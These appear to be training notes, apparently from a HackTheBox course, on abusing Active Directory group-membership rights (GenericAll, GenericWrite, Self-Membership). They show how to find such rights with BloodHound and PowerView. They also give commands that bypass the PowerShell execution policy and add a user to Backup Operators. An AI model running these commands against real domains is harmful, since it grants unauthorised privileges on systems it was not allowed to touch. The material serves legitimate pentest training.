
---
---
When an attacker controls a privileged user account with the ability to edit a group's member attribute, they can effectively add new users to that group. This attack/abuse is possible when the controlled account has `GenericAll`, `GenericWrite`, `Self`, `AllExtendedRights`, or `Self-Membership` over the target group.
## Identifying Vulnerable Groups

We can use `BloodHound` to determine if we have those privileges via the [AddMembers](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#addmembers) edge:

![addmember_bloodhound.png](https://academy.hackthebox.com/storage/modules/219/addmember_bloodhound.png)


```powershell
PS C:\Tools> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> $userSID = (Get-DomainUser -Identity pedro).objectsid
PS C:\Tools> Get-DomainObjectAcl -Identity 'Backup Operators' -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}
```
## Abusing AddMember From Windows

> Query the Backup Operators Group Membership

```cmd
net localgroup "Backup Operators"
```

> Trying to add Pedro to the Backup Operators Group with net

```cmd
 net localgroup "Backup Operators" pedro /add
```

> Adding a User to Group using PowerView

```powershell
Add-DomainGroupMember -Identity "Backup Operators" -Members pedro -Verbose
```

